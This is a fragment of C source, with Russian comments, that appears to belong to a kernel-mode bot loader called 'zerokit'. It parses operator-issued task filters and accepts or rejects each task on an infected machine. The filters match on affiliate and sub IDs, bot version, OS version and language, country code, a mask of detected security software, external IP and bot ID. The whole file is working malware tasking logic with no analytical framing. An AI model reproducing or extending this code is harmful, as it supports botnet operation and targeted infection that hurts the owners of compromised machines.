// Данная функция реализует проверку двойныъ параметров (сейчас адаптирована исключительно для проверки пар аффид/саб)
bool_t tasks_filter_uint32_pair(char** pItr, char* end, uint32_t realVal1, uint32_t realVal2)
{
    uint32_t val1;
    uint32_t val2;
    char* pos1;
    char* pos2;
    bool_t isOK = FALSE;
    char* itr = *pItr;
    USE_GLOBAL_BLOCK

    if (*itr != ';') {
        // Проверяем на совпадение аффида и саба.
        for ( ; itr < end && *itr != ';'; ++itr) {
            pos1 = itr;
            for ( ; itr < end && *itr != ':'; ++itr);
            if (*itr != ':') {
//                 {
//                     char msg[] = {'b', 'r', 'e' ,'a', 'k', ':', ' ', '\0'};
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(itr);
//                     msg[0] = '\n';
//                     msg[1] = '\0';
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                 }
                break;
            }
            pos2 = (++itr);
            for ( ; itr < end && *itr != ',' && *itr != ';'; ++itr);
            if (*itr != ',' && *itr != ';') {
//                 {
//                     char msg[] = {'b', 'r', 'e' ,'a', 'k', ':', ' ', '\0'};
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(itr);
//                     msg[0] = '\n';
//                     msg[1] = '\0';
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                 }
                break;
            }

            if (*itr == ';') {
                --itr;
            }

            val1 = (uint32_t)pGlobalBlock->pCommonBlock->fncommon_atou64(pos1, 11);
            val2 = (uint32_t)pGlobalBlock->pCommonBlock->fncommon_atou64(pos2, 11);

//             {
//                 char msg[] = {'%', 'u', ':' ,'%', 'u', '\n', '\0'};
//                 pGlobalBlock->pCommonBlock->fnDbgPrint(msg, val1, val2);
//             }

            if (realVal1 == val1 && (realVal2 == val2 || val2 == 0)) {
                isOK = TRUE;

            }
        }
    }
    else {
        isOK = TRUE;
    }

    *pItr = itr;

    return isOK;
}

bool_t tasks_filter_numeric(char** pItr, char* end, uint64_t realVal)
{
    char* pos1;
    bool_t isOK = FALSE;
    uint64_t val;
    char* itr = *pItr;
    USE_GLOBAL_BLOCK

    if (*itr != ';') {
        // Проверяем на совпадение аффида и саба.
        for ( ; itr < end && *itr != ';'; ++itr) {
            pos1 = itr;
            for ( ; itr < end && *itr != ',' && *itr != ';'; ++itr);
            if (*itr != ',' && *itr != ';') {
//                 {
//                     char msg[] = {'b', 'r', 'e' ,'a', 'k', ':', ' ', '\0'};
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(itr);
//                     msg[0] = '\n';
//                     msg[1] = '\0';
//                     pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                 }
                break;
            }

            if (*itr == ';') {
                --itr;
            }

            val = pGlobalBlock->pCommonBlock->fncommon_atou64(pos1, 21);

            if (realVal == val) {
                isOK = TRUE;
            }
        }
    }
    else {
        isOK = TRUE;
    }

    *pItr = itr;

    return isOK;
}

void tasks_filter(ptask_t pTask)
{
    bool_t isOk = FALSE;
    bool_t paramOk = FALSE;
    char* itr;
    char* end;
    char* pos1;
    uint64_t hipsMask;
    pconfiguration_t pConfig;
    USE_GLOBAL_BLOCK

    pConfig = pGlobalBlock->pCommonBlock->pConfig;

    //if ()

    // Формат фильтра:
    // affid1:subid1,affid1:subid2,...affid2:subid1,affid2:subid2,...;bot_ver1,bot_ver1,...;os_ver1,os_ver12,...;os_lang1,os_lang2,...;cc1,cc2,...;hips_mask;ip1,ip2,...;bot_id1,bot_id2,...;
    itr = pTask->filter + 4;
    end = itr + pGlobalBlock->pCommonBlock->fnstrlen(itr);

    do {
        // Пропускаем пробелы.
        for ( ; itr < end && (*itr == ' ' || *itr == '\t'); ++itr);
        if (itr == end) {
            break;
        }

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '1', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(itr);
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        if (!pGlobalBlock->pTasksBlock->fntasks_filter_uint32_pair(&itr, end, pGlobalBlock->pCommonBlock->zerokitHeader.affid, pGlobalBlock->pCommonBlock->zerokitHeader.subid) || itr >= end) {
//             {
//                 char msg[] = {'b', 'r', 'e' ,'a', 'k', '!', ':', ' ', '\0'};
//                 pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//                 pGlobalBlock->pCommonBlock->fnDbgPrint(itr);
//                 msg[0] = '\n';
//                 msg[1] = '\0';
//                 pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//             }
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '2', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        if (!pGlobalBlock->pTasksBlock->fntasks_filter_numeric(&itr, end, (_MAJOR_VERSION << 4) | _MINOR_VERSION) || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '3', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        if (!pGlobalBlock->pTasksBlock->fntasks_filter_numeric(&itr, end, pGlobalBlock->osVer) || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '4', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }
// 
        if (!pGlobalBlock->pTasksBlock->fntasks_filter_numeric(&itr, end, pGlobalBlock->osLang) || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '5', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        if (*itr != ';') {
            for ( ; itr < end && *itr != ';'; ++itr) {
                pos1 = itr;
                for ( ; itr < end && *itr != ',' && *itr != ';'; ++itr);
                if (*itr != ',' && *itr != ';') {
                    break;
                }

                if (*itr == ';') {
                    --itr;
                }

                if (*((uint16_t*)pos1) == pGlobalBlock->countryCode) {
                    paramOk = TRUE;
                }
            }
        }
        else {
            paramOk = TRUE;
        }

        if (!paramOk || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '6', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        paramOk = FALSE;
        if (*itr != ';') {
            // Проверяем на совпадение аффида и саба.
            for ( ; itr < end && *itr != ';'; ++itr) {
                pos1 = itr;
                for ( ; itr < end && *itr != ',' && *itr != ';'; ++itr);
                if (*itr != ',' && *itr != ';') {
                    break;
                }

                if (*itr == ';') {
                    --itr;
                }

                hipsMask = pGlobalBlock->pCommonBlock->fncommon_atou64(pos1, 21);

                if (hipsMask == 0xFFFFFFFFFFFFFFFFULL || (pGlobalBlock->hipsMask & hipsMask)) {
                    paramOk = TRUE;
                }
            }
        }
        else {
            paramOk = TRUE;
        }

        if (!paramOk || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '7', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        if (!pGlobalBlock->pTasksBlock->fntasks_filter_numeric(&itr, end, pGlobalBlock->externalIp) || itr == end) {
            break;
        }
        ++itr;

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '8', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        paramOk = FALSE;
        if (*itr != ';') {
            // Проверяем на совпадение аффида и саба.
            for ( ; itr < end && *itr != ';'; ++itr) {
                pos1 = itr;
                for ( ; itr < end && *itr != ',' && *itr != ';'; ++itr);
                if (*itr != ',' && *itr != ';') {
                    break;
                }

                if ((itr - pos1) < LOADER_ID_SIZE) {
                    continue;
                }

                if (*itr == ';') {
                    --itr;
                }

                if (MEMCMP(pos1, pGlobalBlock->pCommonBlock->pConfig->botId, LOADER_ID_SIZE)) {
                    paramOk = TRUE;
                }
            }
        }
        else {
            paramOk = TRUE;
        }

        if (!paramOk) {
            break;
        }

//         {
//             char msg[] = {'c', 'h', 'e' ,'c', 'k', 'P', 'o', 'i', 'n', 't', '9', '\n', '\0'};
//             pGlobalBlock->pCommonBlock->fnDbgPrint(msg);
//         }

        isOk = TRUE;
    } while (0);

    if (isOk) {
        pTask->status = TS_Obtained;
    }
    else {
        pTask->status = TS_Rejected;
    }
}


ptask_t tasks_destroy(ptask_t pTask)
{
    ptask_t pNext = pTask->pNext;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTask->uri, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTask->filter, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTask, LOADER_TAG);

    return pNext;
}
